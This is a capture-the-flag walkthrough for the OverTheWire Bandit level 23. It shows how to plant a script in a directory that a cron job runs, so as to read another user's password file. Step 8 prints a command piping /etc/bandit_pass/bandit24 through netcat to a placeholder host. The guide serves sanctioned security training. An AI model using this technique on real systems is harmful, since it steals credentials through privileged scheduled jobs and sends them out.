# bandit23

### Solution Steps:

1. Save the flag which was obtained from **bandit22**. This flag is actually the password to SSH into **bandit23**.
2. Now establish an SSH connection using `sudo ssh bandit23@bandit.labs.overthewire.org -p 2220`.
3. Here is our clue:
   1. A program is running automatically at regular intervals from cron, the time-based job scheduler.
   2. Look in /etc/cron.d/ for the configuration and see what command is being executed.
4. Once you will see the script, you will get to know that this script is checking for any type of file creation by user **bandit23**, in a directory mentioned in that script and if that file is executable, then it is executing it and after that deleting it as well.
5. We cannot list the contents of that directory as well. Also we cannot create any file in our home directory due to lack of such permissions.
6. However, we can create a directory in **/tmp/** dircetory and then we will create our shell script there. Why shell script? Because we will easily copy or move that script in that directory which is mentioned in the script, which is continuously running every minute as a cronjob.
7. So far in this game we have experienced that password for a level is usually stored in **/etc/bandit_pass/current_username** file. Therefor we will write a script to read the content of this file and then we can save it in our /tmp/ directory.
   > `cat /etc/bandit_pass/bandit24 > /tmp/sample_dir/pass`
8. We can also use netcat as well, like this
   > `cat /etc/bandit_pass/bandit24 | netcat ip_address_of_machine listening_port` 
9. Transfer the script in the directory which you have figured out in step 4 and wait for one minute. Once the script will run it will throw password to the path you have specified :)
10. Save this password and see you in next level :) 